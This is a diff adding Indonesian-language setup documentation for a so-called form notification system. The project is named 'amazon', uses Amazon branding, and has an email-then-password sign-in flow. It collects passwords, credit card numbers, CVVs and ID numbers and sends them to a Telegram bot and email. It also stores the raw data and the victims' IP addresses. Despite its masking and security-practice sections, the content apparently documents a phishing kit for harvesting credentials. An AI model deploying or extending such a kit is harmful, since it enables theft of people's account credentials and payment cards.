@@ -1,0 +1,342 @@
+# ============================================
+# DOKUMENTASI KONFIGURASI SISTEM NOTIFIKASI
+# Form Notification System v1.0.0
+# ============================================
+
+## 📋 Ringkasan Sistem
+Sistem notifikasi otomatis untuk menerima data submit form dari halaman frontend dan meneruskannya ke:
+1. **Telegram Bot** - Notifikasi realtime via chat
+2. **Email SMTP** - Notifikasi email formal dengan template HTML
+
+Fitur tambahan:
+- ✅ Masking data sensitif (password, kartu kredit, CVV, dll)
+- ✅ Koneksi terenkripsi (HTTPS untuk API Telegram, TLS untuk SMTP)
+- ✅ Database cadangan SQLite (data tidak hilang meskipun notifikasi gagal)
+- ✅ Auto-retry setiap 5 menit untuk notifikasi yang gagal
+- ✅ Error logging terperinci (file + database)
+- ✅ Validasi input & payload size limit
+
+---
+
+## 🔧 Langkah 1: Konfigurasi Environment (.env)
+
+Salin file `.env.example` menjadi `.env` dan isi nilai berikut:
+
+### A. Konfigurasi Telegram Bot API
+
+```env
+TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here
+TELEGRAM_CHAT_ID=your_chat_id_here
+```
+
+#### Cara Mendapatkan Token Bot Telegram:
+1. Buka Telegram, cari **@BotFather**
+2. Kirim pesan `/newbot` dan ikuti instruksi
+3. Setelah selesai, BotFather akan memberikan **HTTP API Token** (contoh: `123456789:ABCdefGhIJKlmNoPQRstUvWxYz123456`)
+4. Paste token tersebut ke `TELEGRAM_BOT_TOKEN`
+
+#### Cara Mendapatkan Chat ID Telegram:
+1. **Chat Pribadi**: Cari **@userinfobot** di Telegram, kirim pesan apapun, catat `Id`
+2. **Grup**: Tambahkan bot ke grup, kirim `/my_id @nama_bot`, atau akses:
+   ```
+   https://api.telegram.org/bot<TOKEN_BOT>/getUpdates
+   ```
+   Lihat field `chat.id` dari response JSON
+3. **Multiple Chat ID**: Pisahkan dengan koma, contoh: `123456789,987654321,-1001234567890`
+
+---
+
+### B. Konfigurasi SMTP Email
+
+```env
+SMTP_HOST=smtp.gmail.com
+SMTP_PORT=587
+SMTP_SECURE=false
+SMTP_USER=your_email@example.com
+SMTP_PASS=your_app_password
+SMTP_FROM_NAME="Form Notification System"
+SMTP_TO=admin@example.com,manager@example.com
+```
+
+#### Daftar SMTP Provider Populer:
+
+| Provider      | Host               | Port | Secure/TLS | Catatan |
+|---------------|--------------------|------|------------|---------|
+| **Gmail**     | smtp.gmail.com     | 587  | STARTTLS   | Gunakan **App Password** (bukan password biasa) jika 2FA aktif |
+| **Yahoo Mail**| smtp.mail.yahoo.com| 587  | STARTTLS   | Buat App Password di Account Settings |
+| **Outlook/Hotmail** | smtp.office365.com | 587 | STARTTLS | Autentikasi modern mungkin diperlukan |
+| **Zoho Mail** | smtp.zoho.com      | 587  | STARTTLS   | Verifikasi domain terlebih dahulu |
+| **SendGrid**  | smtp.sendgrid.net  | 587  | STARTTLS   | Gunakan API Key sebagai password |
+| **Mailgun**   | smtp.mailgun.org   | 587  | STARTTLS   | Default SMTP credentials |
+| **cPanel/Hosting** | mail.domainanda.com | 587 / 465 | STARTTLS / SSL | Lihat di cPanel Email Accounts > Configure Mail Client |
+
+#### Cara Membuat App Password Gmail (Wajib jika 2FA Aktif):
+1. Kunjungi [myaccount.google.com/apppasswords](https://myaccount.google.com/apppasswords)
+2. Login dengan akun Gmail
+3. Pilih app: **Other (Custom name)** → Isi nama (mis: Form Notif System)
+4. Copy password 16 karakter yang di-generate → paste ke `SMTP_PASS`
+
+---
+
+### C. Konfigurasi Server Opsional
+
+```env
+PORT=3000
+NODE_ENV=production
+ENABLE_HTTPS=false
+SSL_CERT_PATH=./certs/cert.pem
+SSL_KEY_PATH=./certs/key.pem
+```
+
+---
+
+## 📦 Langkah 2: Instalasi Dependensi
+
+```bash
+npm install
+```
+
+---
+
+## ▶️ Langkah 3: Menjalankan Sistem
+
+### Mode Development / Production:
+```bash
+npm start
+```
+
+Server berjalan di:
+- HTTP (default): `http://localhost:3000`
+- HTTPS (jika ENABLE_HTTPS=true): `https://localhost:3000`
+
+---
+
+## 📝 Format Notifikasi yang Dihasilkan
+
+### A. Format Pesan Telegram (MarkdownV2)
+
+```
+🔔 *NOTIFIKASI SUBMIT BARU*
+
+📋 *ID Submit:* `SUB-XXXXXX-XXXXXX`
+🕒 *Waktu:* 25/07/2026 14:30:45
+
+📝 *Detail Data Pengguna:*
+
+*Email:* user@example\.com
+*Password (Masked):* R\*\*\*\*\*\*3
+*Nama Lengkap:* Budi Santoso
+*Kota:* Jakarta Selatan
+*No\. Kartu (Masked):* `****-****-****-1111`
+*CVV (Masked):* \*\*\*
+
+🌐 *IP Pengirim:* `192\.168\.1\.100`
+💻 *User Agent:* `Mozilla/5\.0 \(Windows NT 10\.0;...`
+
+━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ *Sistem Notifikasi Otomatis*
+```
+
+### B. Format Email (HTML Template Responsive)
+
+| Bagian | Isi |
+|--------|-----|
+| **Subjek Email** | `[NOTIFIKASI] Data Submit Baru - SUB-XXX - 25/07/2026` |
+| **Header** | Logo sistem + warna tema Amazon (biru tua #232f3e) |
+| **Info Box** | ID Submit, Waktu |
+| **Tabel Data** | Semua field dengan label terjemahan Bahasa Indonesia |
+| **Meta Info** | IP Pengirim, User Agent |
+| **Footer** | Disclaimer email otomatis |
+
+**Catatan Keamanan Email:**
+- Field **password, CVV, kartu kredit** otomatis di-masking sebelum dikirim
+- Seluruh pengiriman SMTP wajib TLS v1.2+ (`rejectUnauthorized: true`)
+- Header email khusus: `X-Notification-Submission-ID` untuk tracking
+
+---
+
+## 🛡️ Daftar Field Sensitif yang Otomatis Di-Masking
+
+| Field Terdeteksi (case-insensitive) | Contoh Hasil Masking |
+|-------------------------------------|----------------------|
+| `password`, `pass`, `pwd`           | `Rah***23` |
+| `token`, `secret`, `api_key`        | `tok***en` |
+| `credit_card`, `card_number`, `cc`  | `****-****-****-1234` |
+| `cvv`, `ccv`                        | `***` |
+| `ssn`, `nik`, `ktp`, `nip`          | `320***8901` |
+
+---
+
+## 🗄️ Struktur Database Cadangan (SQLite: data/submissions.db)
+
+### Tabel `submissions` (Penyimpanan Semua Submit)
+| Kolom | Tipe | Keterangan |
+|-------|------|------------|
+| `id` | INTEGER PK | Auto increment |
+| `submission_id` | TEXT UNIQUE | ID unik SUB-XXXXXX-XXXXXX |
+| `raw_data` | TEXT JSON | Data ASLI submit (untuk keperluan audit, HANYA simpan jika perlu) |
+| `sanitized_data` | TEXT JSON | Data yang SUDAH di-masking (untuk notifikasi) |
+| `client_ip` | TEXT | IP pengirim |
+| `user_agent` | TEXT | Browser/device info |
+| `telegram_status` | TEXT | `PENDING/SUCCESS/FAILED/SKIPPED` |
+| `telegram_error` | TEXT | Pesan error jika gagal |
+| `email_status` | TEXT | Sama seperti di atas |
+| `email_error` | TEXT | Pesan error email |
+| `overall_status` | TEXT | `PENDING/SUCCESS/PARTIAL/FAILED/SKIPPED` |
+| `retry_count` | INTEGER | Jumlah percobaan retry (max 5) |
+| `created_at` | DATETIME | Waktu submit |
+| `updated_at` | DATETIME | Waktu update terakhir |
+
+### Tabel `notification_logs` (Riwayat Pengiriman)
+- Setiap upaya pengiriman (Telegram/Email) dicatat 1 baris di sini
+- Status, error message, dan response API tersimpan lengkap
+
+### Tabel `error_logs` (Log Error Sistem)
+- Komponen mana yang error, stack trace, context data, dan submission_id terkait
+- Berguna untuk debugging production
+
+---
+
+## 🧪 Langkah 4: Pengujian Fungsionalitas
+
+### Jalankan Suite Pengujian Otomatis:
+```bash
+npm test
+```
+
+**Yang diuji otomatis:**
+1. ✅ Data masking (password, kartu kredit, CVV) tidak bocor
+2. ✅ Koneksi Telegram Bot API (getMe + kirim pesan uji)
+3. ✅ Koneksi SMTP (verify + kirim email uji)
+4. ✅ Endpoint `/api/submit` (submit normal, empty body, invalid JSON)
+5. ✅ Database backup + mekanisme retry gagal
+
+### Pengujian Manual Via UI:
+1. Buka `http://localhost:3000` di browser
+2. Isi **email** sembarang → klik Continue
+3. Isi **password** (contoh: `Test123!`) → klik Sign in
+4. Periksa:
+   - Notifikasi muncul di Telegram akun Anda
+   - Email masuk ke inbox penerima (cek spam jika tidak ada)
+   - **Pastikan password di notifikasi BERBENTUK BINTANG** (tidak asli)
+
+### Pengujian Error Handling (Simulasi Koneksi Terputus):
+1. **Cara cepat**: Nonaktifkan internet / isi token Telegram yang salah
+2. Submit form dari UI
+3. Verifikasi:
+   - Endpoint tetap merespons (tidak crash)
+   - Status `overallStatus = FAILED` atau `PARTIAL`
+   - Data submit **tetap tersimpan** di `data/submissions.db` (buka dengan DB Browser for SQLite)
+   - Setelah koneksi normal, jalankan retry manual:
+     ```bash
+     curl -X POST http://localhost:3000/api/retry-failed
+     ```
+   - Atau tunggu **5 menit** (scheduler otomatis retry)
+
+---
+
+## 🔍 Endpoint API Tersedia
+
+| Method | Endpoint | Auth | Deskripsi |
+|--------|----------|------|-----------|
+| `GET` | `/api/health` | No | Health check ringkas (uptime, status) |
+| `GET` | `/api/health/detailed` | No | Health check detail (status koneksi Telegram, Email, DB) |
+| `POST` | `/api/submit` | No | **Endpoint utama**: Terima data form → Kirim notifikasi → Simpan backup |
+| `POST` | `/api/retry-failed` | No | Jalankan proses retry manual untuk submit yang gagal |
+
+### Contoh Request `POST /api/submit`:
+```bash
+curl -X POST http://localhost:3000/api/submit \
+  -H "Content-Type: application/json" \
+  -d '{
+    "email": "pengguna@test.com",
+    "password": "IniRahasia123",
+    "nama": "Pengguna Test",
+    "credit_card": "4111111111111111",
+    "hp": "08123456789"
+  }'
+```
+
+### Contoh Response Sukses:
+```json
+{
+  "success": true,
+  "submissionId": "SUB-LV1ABC-XYZ123",
+  "overallStatus": "SUCCESS",
+  "notifications": {
+    "telegram": { "sent": true, "skipped": false },
+    "email":    { "sent": true, "skipped": false }
+  },
+  "message": "Form received and notifications sent successfully",
+  "timestamp": "2026-07-25T07:30:00.000Z"
+}
+```
+
+---
+
+## 🔐 Praktik Keamanan Wajib untuk Production
+
+1. **Gunakan HTTPS**: Aktifkan `ENABLE_HTTPS=true` dengan sertifikat SSL valid (Let's Encrypt / Cloudflare)
+2. **Lindungi File `.env`**: Jangan pernah commit ke Git (sudah di .gitignore), atur permission `chmod 600 .env`
+3. **Rate Limiting**: Tambahkan middleware rate-limit di production untuk mencegah spam submit
+4. **CORS**: Ubah origin CORS di `server.js` jika perlu (saat ini all-allowed untuk development)
+5. **Rotasi Kredensial**: Ganti token bot & password SMTP secara berkala
+6. **Hapus `raw_data` jika perlu**: Jika tidak butuh audit data asli, modifikasi `databaseService.js` untuk tidak menyimpan `raw_data`
+7. **Backup Database**: Jadwalkan backup rutin folder `data/` dan `logs/`
+
+---
+
+## 📂 Struktur Direktori Proyek
+
+```
+amazon/
+├── config/
+│   └── config.js             # Parser environment variables
+├── routes/
+│   └── api.js                # Express routes (/api/*)
+├── services/
+│   ├── databaseService.js    # SQLite CRUD + Backup
+│   ├── emailService.js       # Nodemailer SMTP TLS
+│   ├── notificationService.js# Orkestrasi + Retry Scheduler
+│   └── telegramService.js    # Telegram Bot API HTTPS
+├── utils/
+│   ├── logger.js             # Winston logging (file + console)
+│   └── security.js           # Data masking + helpers
+├── data/                     # 🗄️ Database SQLite (auto-created)
+├── logs/                     # 📝 Log files (auto-created)
+├── certs/                    # 🔐 SSL certificates (optional)
+├── index.html                # Frontend form
+├── style.css / script.js     # Frontend assets
+├── server.js                 # 🚀 Entry point Express server
+├── test-notifications.js     # 🧪 Test suite
+├── package.json
+├── .env.example              # Template konfigurasi
+├── .env                      # ⚠️ Kredensial asli (JANGAN DI-COMMIT)
+└── DOKUMENTASI-KONFIGURASI.txt  # Dokumen ini
+```
+
+---
+
+## ❓ Troubleshooting Umum
+
+| Masalah | Solusi |
+|---------|--------|
+| Telegram: "Bot was blocked by the user" | Chat user terblokir, minta penerima `/start` bot Anda |
+| Telegram: "Chat not found" | Chat ID salah / user belum pernah chat bot (chat `/start` dulu) |
+| Email Gmail: "Invalid login" | Gunakan **App Password**, bukan password biasa. Aktifkan 2FA dulu |
+| Email masuk folder spam | Konfigurasi SPF/DKIM/DMARC di domain Anda, atau gunakan layanan transactional (SendGrid/Mailgun) |
+| Port 3000 sudah terpakai | Ganti `PORT=3001` di `.env` |
+| Error `better-sqlite3` saat install | Install build tools: `npm install -g windows-build-tools` atau install Python 3 + Visual Studio Build Tools |
+| Notifikasi tidak masuk tapi status sukses | Cek log di `logs/combined.log`, atau cek `data/submissions.db` |
+
+---
+
+## 📞 Pemeliharaan Sistem
+
+- **Cek log error**: File `logs/error.log` dan tabel `error_logs` di database
+- **Lihat antrian gagal**: `SELECT submission_id, overall_status, retry_count FROM submissions WHERE overall_status IN ('FAILED','PARTIAL');`
+- **Backup data**: Copy folder `data/` secara periodik
+- **Monitor resource**: Jalankan health check `/api/health/detailed` via uptime monitor (UptimeRobot, BetterStack, dll)
+
+---
+*Versi dokumentasi: 1.0 | Terakhir diperbarui: 25 Juli 2026*
